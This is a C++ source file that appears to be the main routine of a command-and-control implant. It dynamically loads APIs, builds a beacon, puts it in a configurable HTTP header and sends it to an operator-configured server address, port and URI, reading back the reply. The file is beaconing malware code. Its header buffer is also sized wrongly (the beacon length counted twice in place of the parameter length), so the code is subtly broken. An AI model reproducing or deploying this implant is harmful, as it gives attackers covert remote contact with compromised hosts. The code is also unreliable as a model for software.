#include "main.h"
#include "ApiLoader.h"
#include "utils.h"

Agent*         g_Agent;
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) return;

	g_Agent  = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	LPSTR beat         = g_Agent->BuildBeat();
	ULONG beat_length  = StrLenA(beat);
	ULONG param_length = StrLenA( (CHAR*)g_Agent->config->param_name );
	
	CHAR* HttpHeaders = (CHAR*) MemAllocLocal(beat_length + beat_length + 5);
	memcpy(HttpHeaders, g_Agent->config->param_name, param_length);
	ULONG index = param_length;
	memcpy(HttpHeaders + index, ": ", 2);
	index += 2;
	memcpy( HttpHeaders + index, beat, beat_length );
	index += beat_length;
	memcpy(HttpHeaders + index, "\r\n", 3);

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();
	g_Connector->SetConfig(
		g_Agent->config->use_ssl,
		(CHAR*)g_Agent->config->user_agent,
		(CHAR*)g_Agent->config->method,
		(CHAR*)g_Agent->config->address,
		g_Agent->config->port,
		(CHAR*)g_Agent->config->uri,
		HttpHeaders
	);

	ULONG recv_size = 0;
	BYTE* recv = g_Connector->SendData(NULL, NULL, &recv_size);

}